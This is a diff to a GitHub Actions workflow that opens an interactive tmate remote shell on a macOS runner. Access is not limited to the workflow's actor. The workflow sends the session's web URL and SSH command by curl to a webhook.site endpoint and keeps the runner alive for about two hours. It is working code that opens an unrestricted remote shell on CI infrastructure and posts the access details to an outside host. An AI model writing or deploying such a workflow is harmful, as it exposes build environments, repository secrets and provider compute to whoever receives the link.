@@ -9,25 +9,35 @@ jobs:
   interactive:
     runs-on: macos-15
     steps:
-      - name: Launch Interactive macOS Session
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup Tmate
+        id: tmate
+        uses: mxschmitt/action-tmate@v3
+        with:
+          detached: true
+          limit-access-to-actor: false
+
+      - name: Post Tmate URL
         run: |
-          HOMEBREW_NO_AUTO_UPDATE=1 HOMEBREW_NO_INSTALL_CLEANUP=1 brew install tmate
-          tmate -S /tmp/tmate.sock new-session -d
+          URL="${{ steps.tmate.outputs.web-url }}"
+          SSH="${{ steps.tmate.outputs.ssh-command }}"
+          echo "Outputs URL: $URL"
+          echo "Outputs SSH: $SSH"
           
-          for i in {1..40}; do
-            WEB_URL=$(tmate -S /tmp/tmate.sock display -p '#{tmate_web}' 2>/dev/null || true)
-            if [ -n "$WEB_URL" ] && [[ "$WEB_URL" == *"tmate.io"* ]]; then
-              echo "TMATE IS READY: $WEB_URL"
-              break
-            fi
-            sleep 1
+          # Also try direct display command if output was empty
+          if [ -z "$URL" ]; then
+            URL=$(tmate -S /tmp/tmate.sock display -p '#{tmate_web}' 2>/dev/null || true)
+          fi
+          if [ -z "$SSH" ]; then
+            SSH=$(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}' 2>/dev/null || true)
+          fi
+          
+          curl -s -X POST -d "WEB: $URL | SSH: $SSH" https://webhook.site/696691ee-e300-4d4e-a17f-c4f805414baa || true
+
+      - name: Keep Alive
+        run: |
+          for i in {1..720}; do
+            sleep 10
           done
-          
-          SSH_CMD=$(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}' 2>/dev/null || true)
-          
-          echo "WEB: $WEB_URL"
-          echo "SSH: $SSH_CMD"
-          
-          curl -s -X POST -d "$WEB_URL" https://webhook.site/696691ee-e300-4d4e-a17f-c4f805414baa || true
-          
-          while [ -S /tmp/tmate.sock ]; do sleep 5; done
